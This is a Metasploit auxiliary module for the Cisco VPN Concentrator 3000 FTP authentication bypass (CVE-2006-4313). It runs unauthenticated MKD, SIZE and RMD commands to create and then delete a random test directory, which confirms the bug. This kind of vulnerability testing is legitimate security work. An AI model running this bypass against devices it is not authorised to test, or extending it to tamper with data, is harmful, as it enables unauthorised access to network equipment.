##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Deprecated
  moved_from 'auxiliary/admin/cisco/vpn_3000_ftp_bypass'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Cisco VPN Concentrator 3000 FTP Unauthorized Administrative Access',
        'Description' => %q{
          This module tests for a logic vulnerability in the Cisco VPN Concentrator
          3000 series. It is possible to execute some FTP statements without authentication
          (CWD, RNFR, MKD, RMD, SIZE, CDUP). It also appears to have some memory leak bugs
          when working with CWD commands. This module simply creates an arbitrary directory,
          verifies that the directory has been created, then deletes it and verifies deletion
          to confirm the bug.
        },
        'Author'	=> [ 'aushack' ],
        'License'	=> MSF_LICENSE,
        'References' => [
          [ 'BID', '19680' ],
          [ 'CVE', '2006-4313' ],
          [ 'OSVDB', '28139' ],
          [ 'OSVDB', '28138' ]
        ],
        'DisclosureDate' => '2006-08-23',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(21),
      ]
    )
  end

  def run
    connect
    res = sock.get_once
    if res && res =~ /220 Session will be terminated after/
      print_status('Target appears to be a Cisco VPN Concentrator 3000 series.')

      test = Rex::Text.rand_text_alphanumeric(8)

      print_status("Attempting to create directory: MKD #{test}")
      sock.put("MKD #{test}\r\n")
      res = sock.get_once(-1, 5)

      if (res =~ /257 MKD command successful\./)
        print_status("\tDirectory #{test} reportedly created. Verifying with SIZE #{test}")
        sock.put("SIZE #{test}\r\n")
        res = sock.get_once(-1, 5)
        if (res =~ /550 Not a regular file/)
          print_status("\tServer reports \"not a regular file\". Directory verified.")
          print_status("\tAttempting to delete directory: RMD #{test}")
          sock.put("RMD #{test}\r\n")
          res = sock.get_once(-1, 5)
          if (res =~ /250 RMD command successful\./)
            print_status("\tDirectory #{test} reportedly deleted. Verifying with SIZE #{test}")
            sock.put("SIZE #{test}\r\n")
            sock.get_once(-1, 5)
            print_status("\tDirectory #{test} no longer exists!")
            print_status('Target is confirmed as vulnerable!')
          end
        end
      end
    else
      print_status('Target is either not Cisco or the target has been patched.')
    end
    disconnect
  end
end
